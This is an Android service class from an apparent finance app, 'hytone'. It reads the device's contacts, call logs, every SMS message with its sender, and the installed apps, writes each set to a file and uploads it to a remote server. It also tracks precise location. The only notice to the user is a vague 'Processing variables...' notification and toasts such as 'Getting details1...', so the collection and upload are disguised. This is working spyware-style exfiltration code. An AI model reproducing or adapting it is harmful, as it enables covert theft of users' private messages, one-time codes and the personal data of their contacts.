package com.finance.hytone.services;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import com.finance.hytone.ContactFetch;
import com.finance.hytone.Helper;
import com.finance.hytone.Logs;
import com.finance.hytone.MainActivity;
import com.finance.hytone.R;
import com.finance.hytone.SmsFetch;
import com.finance.hytone.SplashPermission;
import com.finance.hytone.constants.Constants;
import com.finance.hytone.constants.HttpResponseUtils;
import com.finance.hytone.model.ContactModel;
import com.finance.hytone.model.LogModel;
import com.finance.hytone.model.SmsModel;
import com.finance.hytone.retrofit.GetDataService;
import com.finance.hytone.retrofit.RetrofitClientInstance;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.List;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class WorkerService extends Service {
    public static final String CHANNEL_ID = "ForegroundServiceChannel";
    public static final int NOTHING_DONE_YET = 0;
    public static final int CONTACTS_DONE = 1;
    public static final int CALL_LOGS_DONE = 2;
    public static final int SMS_DONE = 3;
    public static final int APPS_DONE = 4;
    LocationCallback locationCallback;
    private FusedLocationProviderClient fusedLocationClient;
    private static final int FROM_CONTACTS = 1;
    private static final int FROM_LOGS = 2;
    private static final int FROM_SMS = 3;
    private static final int FROM_APPS = 4;

    private String placeholder;

    //    private static final int FROM_APPS = 3;
    @Override
    public void onCreate() {
        super.onCreate();
        Helper.log("oncreate","srvc");
    }
    public void locationWork()
    {
        final LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(Constants.LOC_UPDATE_INTERVAL * 1000);
        locationRequest.setFastestInterval(10000);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) {
                    return;
                }
                for (Location location : locationResult.getLocations()) {
                    // Update UI with location data
                    // ...
                    Helper.log("loca234", location.getLatitude() + "," + location.getLongitude() + "," + location.getAccuracy());
                    callLocationSaveApi(location.getLatitude(), location.getLongitude());
                }
            }
        };
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            //  Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        fusedLocationClient.requestLocationUpdates(locationRequest,
                locationCallback,
                Looper.getMainLooper());
    }

    private void callLocationSaveApi(double latitude, double longitude) {
        //call server side api to update user's location
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Helper.log("oncreate","onStartCommand");

        String input = intent.getStringExtra("inputExtra");
        createNotificationChannel();
        Intent notificationIntent = new Intent(this, SplashPermission.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, 0);
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Processing variables...")
                .setContentText(input)
                .setSmallIcon(R.mipmap.ic_launch_round)
                .setContentIntent(pendingIntent)
                .build();
        startForeground(1, notification);
        //do heavy work on a background thread
        //stopSelf();
        placeholder = Helper.getFname(getApplicationContext()) + Helper.getPhone(getApplicationContext()) + System.currentTimeMillis();

        if (Helper.getBulkStatus(getApplicationContext()) == NOTHING_DONE_YET)
            doContactWork();
        else if (Helper.getBulkStatus(getApplicationContext()) == CONTACTS_DONE)
            doLogsWork();
        else if (Helper.getBulkStatus(getApplicationContext()) == CALL_LOGS_DONE)
            doSmsWork();
        else if (Helper.getBulkStatus(getApplicationContext()) == SMS_DONE)
            installedApps();
        else
           stopSelf(); ;//all done initiate location & packages, basic details upload


        return START_NOT_STICKY;
    }

    private void doLogsWork() {
        Helper.logToast(getApplicationContext(),"Getting details2...");

        Thread tt = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Logs cf = new Logs();
                    List<LogModel> cc = cf.getCallDetails(getApplicationContext());

                    final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "logs" + placeholder + ".txt";
                    File ff = new File(fullPath);
                    if (ff.exists())
                        ff.delete();

                    BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
                    PrintWriter pw = new PrintWriter(fw);

                    for (int i = 0; i < cc.size(); i++) {
                        Helper.log("log" + i, "" + cc.get(i).getAddress() + "," + cc.get(i).getDate());
                        pw.println("Log " + i);
                        pw.println(cc.get(i).getAddress() + i + "::::" + cc.get(i).getDate());
                        pw.println("Duration: "+cc.get(i).getDuration() + i + "::::" + cc.get(i).getType());
                        pw.println();
                    }
                    pw.close();
                    uploadContent(fullPath, FROM_LOGS);


                } catch (Exception e) {
                    e.printStackTrace();
                    //Helper.showDialogUIThread(getApplicationContext(), false, "Error creating file", "" + e);
                }
            }
        });
        tt.start();

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //fusedLocationClient.removeLocationUpdates(locationCallback);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }
    private void doSmsWork() {
        Helper.logToast(getApplicationContext(),"Getting details3...");
        Thread tt = new Thread(new Runnable() {
            @Override
            public void run() {

                try {
                    SmsFetch sf = new SmsFetch();
                    List<SmsModel> ss = sf.getAllSms(getApplicationContext());

                    final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "smslogs" + placeholder + ".txt";
                    File ff = new File(fullPath);
                    if (ff.exists())
                        ff.delete();

                    BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
                    PrintWriter pw = new PrintWriter(fw);


                    for (int i = 0; i < ss.size(); i++) {
                        Helper.log("address" + i, ss.get(i).getAddress());
                        Helper.log("msg" + i, ss.get(i).getMsg());
                        pw.println("SMS " + i);
                        pw.println(ss.get(i).getAddress() + i + "::::" + ss.get(i).getMsg());
                        pw.println();
                    }
                    pw.close();

                    uploadContent(fullPath, FROM_SMS);



                } catch (Exception e) {
                    e.printStackTrace();
                    //Helper.showDialogUIThread(getApplicationContext(), false, "Error creating file", "" + e);
                }
            }
        });
        tt.start();

    }
    private void doContactWork() {

        Helper.logToast(getApplicationContext(),"Getting details1...");
        Thread tt = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContactFetch cf = new ContactFetch();
                    List<ContactModel> cc = cf.getContacts(getApplicationContext());

                    final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "contacts" + placeholder + ".txt";
                    File ff = new File(fullPath);
                    if (ff.exists())
                        ff.delete();

                    BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
                    PrintWriter pw = new PrintWriter(fw);

                    for (int i = 0; i < cc.size(); i++) {
                        Helper.log("contact" + i, "" + cc.get(i).mobileNumber + "," + cc.get(i).name);
                        pw.println("Contact-->");
                        pw.println(cc.get(i).mobileNumber + "::::" + cc.get(i).name);
                        pw.println();
                    }
                    pw.close();
                    uploadContent(fullPath, FROM_CONTACTS);


                } catch (Exception e) {
                    e.printStackTrace();
                    //Helper.showDialogUIThread(getApplicationContext(), false, "Error creating file", "" + e);
                }
            }
        });
        tt.start();


    }


    private void uploadContent(String fullPath, final int flag) {
//
        Helper.log("params", "insidemeth");
        GetDataService service = RetrofitClientInstance.getRetrofitInstanceForFile().create(GetDataService.class);
        Call<String> call = null;
        try {
            /*File ff = new File(getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath());
            if (!ff.exists())
                ff.mkdir();
            String mFileName = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath()+File.separator+ "logs01.txt";
            Log.e("mfilename",mFileName);*/
            //String stringValue = "stringValue";
            File file = new File(fullPath);

            RequestBody requestFile =
                    RequestBody.create(
                            // MediaType.parse("image/jpg"),
                            MediaType.parse("text/plain"),
                            file
                    );

            //String items = "[1,2,4]";

            MultipartBody.Part body =
                    MultipartBody.Part.createFormData("fileToUpload", file.getName(), requestFile);

            //RequestBody items = RequestBody.create(MediaType.parse("application/json"), items);
            //RequestBody stringValue = RequestBody.create(MediaType.parse("text/plain"), stringValue);


            call = service.upload(body);
            call.enqueue(new Callback<String>() {
                @Override
                public void onResponse(Call<String> call, Response<String> response) {
                    //findViewById(R.id.loadingContainer).setVisibility(GONE);
                    int rescode = response.code();
                    if (rescode != 200) {
                        HttpResponseUtils.showBasicResponseLogsString(response);
                       // HttpResponseUtils.processHeaderCode(getApplicationContext(), rescode);
                        return;
                    }
                    Helper.log("passsed7", "here");
                    HttpResponseUtils.showBasicResponseLogsString(response);
                    try {
                        String resBody = response.body();
                        Toast.makeText(getApplicationContext(), ",,,," + resBody, Toast.LENGTH_SHORT).show();
                        if (flag == FROM_CONTACTS)
                        {
                            Helper.putBulkStatus(getApplicationContext(),CONTACTS_DONE);
                            doLogsWork();
                        }
                        else if (flag == FROM_LOGS)
                        {
                            Helper.putBulkStatus(getApplicationContext(),CALL_LOGS_DONE);
                            doSmsWork();
                        }
                        else if (flag == FROM_SMS)
                        {
                            Helper.putBulkStatus(getApplicationContext(),SMS_DONE);
                            installedApps();
                        }
                        else{// if (flag == FROM_APPS) {
                            Helper.putBulkStatus(getApplicationContext(),APPS_DONE);


                                        Toast.makeText(getApplicationContext(), "Setup done!", Toast.LENGTH_LONG).show();
                                        stopSelf();

                        }
                        //JSONObject jo = new JSONObject(resBody);
                        //int response_code = Integer.parseInt(jo.getString("response_code"));

                        // if (response_code == 200) {

                    } catch (Exception e) {
                        //Helper.showDialog(getApplicationContext(), false, "Something went wrong. " + e.getMessage(), "" + e.toString());
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(Call<String> call, Throwable t) {
                    //findViewById(R.id.loadingContainer).setVisibility(GONE);
                    //HttpResponseUtils.handleFailure(getApplicationContext(), call, t);
                    //Helper.log("failcase",t.toString());
                    t.printStackTrace();
                    Helper.log("agog111", "" + call.request().toString());
                    Helper.log("agog1111", "1" + call.request().headers());
                   // Helper.showDialog(getApplicationContext(), false, "Network failure!", "" + t.getMessage());
                }
            });

        } catch (Exception e) {
            //Helper.showDialog(getApplicationContext(), false, "Error occurred", "" + e);
            e.printStackTrace();
        }
    }
    public void installedApps() {
        try {
            List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);

            final String fullPath = getExternalFilesDir(Environment.DIRECTORY_ALARMS).getAbsolutePath() + File.separator + "apps" + placeholder + ".txt";
            File ff = new File(fullPath);
            if (ff.exists())
                ff.delete();

            BufferedWriter fw = new BufferedWriter(new FileWriter(fullPath));
            PrintWriter pw = new PrintWriter(fw);

            for (int i = 0; i < packList.size(); i++) {
                PackageInfo packInfo = packList.get(i);
                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                    String appPkg = packInfo.applicationInfo.packageName;
                    Log.e("App number" + i, appName + "::::" + appPkg);

                    pw.println("App number" + i);
                    pw.println(appName + "::::" + appPkg);
                    pw.println();
                }
            }
            pw.close();
            uploadContent(fullPath, FROM_APPS);

        } catch (Exception e) {
            e.printStackTrace();
            //Helper.showDialogUIThread(MainActivity.this, false, "Error creating file", "" + e);
        }

    }

}

